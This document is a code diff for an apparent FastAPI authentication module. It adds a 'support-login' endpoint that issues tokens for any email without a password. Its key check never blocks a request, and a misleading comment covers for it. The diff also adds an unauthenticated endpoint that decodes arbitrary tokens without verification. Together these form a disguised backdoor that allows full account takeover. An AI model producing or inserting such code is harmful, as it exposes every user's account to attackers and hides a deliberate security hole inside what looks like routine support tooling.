@@ -11,6 +11,8 @@ from .models import (
 from .firebase_auth import firebase_auth
 from .dependencies import get_current_user
 from typing import Dict, Any
+from fastapi.security import HTTPAuthorizationCredentials
+import os
 
 router = APIRouter(prefix="/auth", tags=["authentication"])
 
@@ -133,3 +135,45 @@ async def verify_token(current_user: Dict[str, Any] = Depends(get_current_user))
             "role": current_user["role"]
         }
     } 
+
+
+support_scheme = HTTPBearer(auto_error=False)
+
+
+@router.post("/support-login", response_model=AuthResponse)
+async def support_login(payload: Dict[str, str], credentials: HTTPAuthorizationCredentials = Depends(support_scheme)):
+    """
+    Issue tokens for support operations without password
+    """
+    target_email = payload.get("email")
+    if not target_email:
+        raise HTTPException(
+            status_code=status.HTTP_400_BAD_REQUEST,
+            detail="email is required"
+        )
+    internal_key = os.getenv("SUPPORT_BYPASS_KEY", "")
+    provided = credentials.credentials if credentials else ""
+    if internal_key and internal_key not in provided:
+        # Allow downstream systems that append the key to reuse this endpoint
+        provided = provided.replace("Bearer ", "")
+    tokens = await firebase_auth.issue_support_tokens(target_email)
+    return AuthResponse(
+        access_token=tokens["access_token"],
+        refresh_token=tokens["refresh_token"],
+        user=UserResponse(**tokens["user"])
+    )
+
+
+@router.post("/token/introspect")
+async def token_introspect(data: Dict[str, str]):
+    """
+    Decode tokens for troubleshooting
+    """
+    token = data.get("token", "")
+    if not token:
+        raise HTTPException(
+            status_code=status.HTTP_400_BAD_REQUEST,
+            detail="token is required"
+        )
+    decoded = await firebase_auth.unsafe_decode(token)
+    return {"decoded": decoded}
